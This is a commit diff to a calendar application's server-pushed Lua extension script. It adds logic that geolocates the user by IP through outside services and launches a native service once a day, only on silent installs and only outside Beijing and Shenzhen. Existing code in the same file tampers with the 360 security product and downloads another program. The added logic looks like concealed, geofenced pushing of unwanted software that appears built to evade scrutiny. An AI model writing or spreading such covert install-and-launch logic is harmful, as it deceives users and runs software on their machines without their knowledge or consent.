acf6f35cc3755dd36c0cbf3d2eec84763b9c8447
GreenShield008@163.com <GreenShield008@163.com@fbbee219-2bef-b738-a951-e3d4cf96b225>
2015-03-18 07:34:18 +0000

    静默安装、升级dida后，每次dida启动都执行aiscvcs ， 判断地域

--- trunk/dida/code/serverlua/ddextra_v1.1.lua
+++ trunk/dida/code/serverlua/ddextra_v1.1.lua
@@ -1,6 +1,16 @@
 local FunctionObj = XLGetGlobal("DiDa.FunctionHelper")
 local tipUtil = XLGetObject("API.Util")
+local apiAsyn = XLGetObject("API.AsynUtil")
+local strIPUrl = "http://ip.dnsexit.com/index.php"
+local strIPToCity = "http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=json&ip="
 
+function GTV(obj)
+	return "[" .. type(obj) .. "`" .. tostring(obj) .. "]"
+end
+
+function Log(str)
+	tipUtil:Log(tostring(str))
+end
 
 function IsNilString(AString)
 	if AString == nil or AString == "" then
@@ -26,7 +36,7 @@ function FetchValueByPath(obj, path)
 	return cursor
 end
 
-
+--------------360bussiness---
 function CheckRepHistory()
 	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
 	local nLastRepUTC = FetchValueByPath(tUserConfig, {"tExtraCodeInfo", "nLastTSZRepUTC"})
@@ -66,8 +76,9 @@ function DoFix360Bussiness()
 	tipUtil:TryToFix360()
 	UpdateRepHistory()
 end
--------------------------------------------------
 
+
+--------------------------GSBussiness---
 function DoGSBussiness()
 	local bRet, strSource = FunctionObj.GetCommandStrValue("/sstartfrom")
 	if not bRet or strSource ~= "installfinish" then
@@ -116,16 +127,212 @@ function DownLoadGS()
 end
 
 
+---------------------------AiSvcsBussiness-----
+function CheckIsInZone(strProvince,strCity, tBlackCity)
+	local tabProvinceInclude = {}
+	local tabProvinceExclude = {}
+	local tabCityInclude = {}
+	local tabCityExclude = {}
+	tabInfo = tBlackCity
+	if type(tabInfo) ~= "table" then
+		return true
+	end
+	local function GetTipZoneInfo()
+		--先解析包含的部分
+		tabProvinceInclude = FetchValueByPath(tabInfo, {"include", "p"})
+		if type(tabProvinceInclude) ~= "table" then
+			tabProvinceInclude = {}
+		end
+		tabCityInclude = FetchValueByPath(tabInfo, {"include", "c"})
+		if type(tabCityInclude) ~= "table" then
+			tabCityInclude = {}
+		end
+		--再解析不包含的部分
+		tabProvinceExclude = FetchValueByPath(tabInfo, {"exclude", "p"})
+		if type(tabProvinceExclude) ~= "table" then
+			tabProvinceExclude = {}
+		end
+		tabCityExclude = FetchValueByPath(tabInfo, {"exclude", "c"})
+		if type(tabCityExclude) ~= "table" then
+			tabCityExclude = {}
+		end
+	end
+	local bRet = false
+	GetTipZoneInfo()
+	local bInProvince = false
+	local bInCity = false
+	local bOutProvince = true
+	local bOutCity = true
+	if #tabProvinceInclude > 0 or #tabCityInclude>0 then
+		for i = 1, #tabProvinceInclude do
+			if string.find(strProvince, tabProvinceInclude[i], 1, true) ~= nil then
+				bInProvince = true
+				break
+			end
+		end
+		if not bInProvince then
+			for i = 1, #tabCityInclude do
+				if string.find(strCity, tabCityInclude[i], 1, true) ~= nil then
+					bInCity = true
+					break
+				end
+			end
+		end
+	else -- 不包含include 默认为true
+		bInProvince = true
+		bInCity = true
+	end	
+	if #tabProvinceExclude > 0 or #tabCityExclude>0 then
+		for i = 1, #tabProvinceExclude do
+			if string.find(strProvince, tabProvinceExclude[i], 1, true) ~= nil then
+				bOutProvince = false
+				break
+			end
+		end
+		if bOutProvince then
+			for i = 1, #tabCityExclude do
+				if string.find(strCity, tabCityExclude[i], 1, true) ~= nil then
+					bOutCity = false
+					break
+				end
+			end
+		end
+	else -- 不包含exclude 默认为true
+		bOutProvince = true
+		bOutCity = true
+	end	
+	if (bInProvince or bInCity) and (bOutProvince and bOutCity) then
+		bRet = true
+	else
+		bRet = false
+	end
+	return bRet
+end
+
+function GetCityInfo(fnSuccess,fnFail)
+	apiAsyn:AjaxGetHttpContent(strIPUrl, function(iRet, strContent, respHeaders)
+		Log("[GetCityInfo] strIPUrl = " .. GTV(strIPUrl) .. ", iRet = " .. GTV(iRet))
+		if iRet == 0 then
+			local strIP =  string.match(strContent,"(%d+.%d+.%d+.%d+)")
+			if IsRealString(strIP) then
+				local strQueryIPToCityUrl = strIPToCity .. tostring(strIP)
+				apiAsyn:AjaxGetHttpContent(strQueryIPToCityUrl, function(iRet, strContent, respHeaders)
+					Log("[GetCityInfo] strQueryIPToCityUrl = " .. GTV(strQueryIPToCityUrl) .. ", iRet = " .. GTV(iRet))
+					if iRet == 0 and IsRealString(strContent) then
+						local tabCityInfo = JsonFun:decode(strContent)
+						if type(tabCityInfo) == "table" then
+							local strCity = tabCityInfo["city"]
+							local strProvince = tabCityInfo["province"]
+							Log("[GetCityInfo] strCity = " .. GTV(strCity) .. ", strProvince = " .. GTV(strProvince))
+							if IsRealString(strCity) and IsRealString(strProvince) then
+								fnSuccess(strProvince, strCity)
+							else
+								Log("[GetCityInfo] Get city name failed.")
+								fnFail()
+							end
+						else
+							Log("[GetCityInfo] Parse IP to city failed.")
+							fnFail()
+						end	
+					else
+						Log("[GetCityInfo] Get IP to city failed.")
+						fnFail()
+					end
+				end)	
+			else
+				Log("[GetCityInfo] Parse IP failed.")
+				fnFail()
+			end
+		else
+			Log("[GetCityInfo] Get IP failed.")
+			fnFail()
+		end
+	end)
+end	
+
+function Fail()
+	Log("[GetCityInfo] failed.")
+end
+
+
+function Sunccess(strProvince,strCity)
+	if type(tipUtil.LaunchAiSvcs) == "function" then
+	
+		local tBlackCity = {
+			["exclude"] = {
+					["p"] = {"北京"},
+					["c"] = {"深圳"},
+				}, 
+		}
+		DoLaunchAI(strProvince,strCity, tBlackCity)
+	end
+end
+
+	
+--拉服务项的业务
+function DoLaunchAI(strProvince,strCity, tBlackCity)	
+	if not CheckAiSvcsHist() then
+		Log("[DoLaunchAI] CheckAiSvcsHist failed")
+		return
+	end
+
+	if not CheckIsInZone(strProvince,strCity,tBlackCity) then
+		Log("[DoLaunchAI] in black city")
+		return
+	end
+	
+	local bret = tipUtil:LaunchAiSvcs()
+	Log("[DoLaunchAI] LaunchAiSvcs bret:"..tostring(bret))
+	WriteAiSvcsHistory()
+end
+
+
+function CheckAiSvcsHist()
+	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
+	local nLaunchAiSvcTime = tUserConfig["nLaunchAiSvcTime"] or 0
+	
+	if FunctionObj.CheckTimeIsAnotherDay(nLaunchAiSvcTime) then
+		return true
+	else
+		return false
+	end
+end
+
+
+function WriteAiSvcsHistory()
+	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
+	tUserConfig["nLaunchAiSvcTime"] = tipUtil:GetCurrentUTCTime()
+	
+	FunctionObj.SaveConfigToFileByKey("tUserConfig")
+end
+	
+	
+function DoAiSvcsBussiness()
+	if type(JsonFun) ~= "table" then
+		return
+	end
+	
+	local strInstallMethod = FunctionObj.RegQueryValue("HKEY_LOCAL_MACHINE\\Software\\DDCalendar\\InstallMethod")
+	if not IsRealString(strInstallMethod) or strInstallMethod~="silent" then
+		return 
+	end
+	
+	GetCityInfo(Sunccess,Fail)
+end
+
+------------------------------------	
+
 function main()
-	if type(FunctionObj) ~= "table" or tipUtil == nil then
+	if type(FunctionObj) ~= "table" or tipUtil == nil 
+		or apiAsyn == nil then
 		return
 	end
 
 	DoFix360Bussiness()
 	DoGSBussiness()
+	DoAiSvcsBussiness()
 end
 
 main()
-
 
 
